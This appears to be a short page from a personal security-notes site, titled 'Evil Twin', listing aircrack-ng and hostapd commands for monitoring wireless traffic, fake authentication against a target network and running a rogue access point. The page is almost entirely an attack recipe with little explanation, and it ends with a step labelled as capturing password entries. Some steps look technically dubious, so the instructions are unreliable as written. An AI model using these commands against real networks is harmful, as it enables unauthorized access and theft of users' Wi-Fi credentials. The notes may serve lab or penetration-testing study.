---
title: Evil Twin
description: ""
summary: ""
date: 2023-09-07T16:06:50+02:00
lastmod: 2023-09-07T16:06:50+02:00
draft: false
weight: 800
toc: true
sidebar:
  collapsed: true
seo:
  title: ""
  description: ""
  canonical: ""
  robots: ""
  noindex: false
---
Stoping NetworkManager:

```sh
airmon-ng start wlp0s20f3
airmon-ng check kill
```

- Capture mac address with AiroDump : 
```sh
airodump-ng wlp0s20f3mon
```

- Attack : 
```sh
airodump-ng --bssid WIFI -w capture wlp0s20f3mon
aireplay-ng --fakeauth 0 -e "CrackMeIfYoucan" -a 1A:C9:8A:4E:A9:BD wlp0s20f3mon
```

Or :

- Configure hostapd.conf

```sh
sudo nano hostapd.conf  

interface=wlp0s20f3mon 
driver=nl80211 
ssid=CrackMeIfYoucan
hw_mode=g 
channel=6 
wpa=2 
wpa_passphrase=easy 
```

- Start the Fake AP
 ```sh
sudo hostapd hostapd.conf 
```

- Capture Password Entries
```sh
hostapd hostapd.conf | tee captured_passwords.txt
```
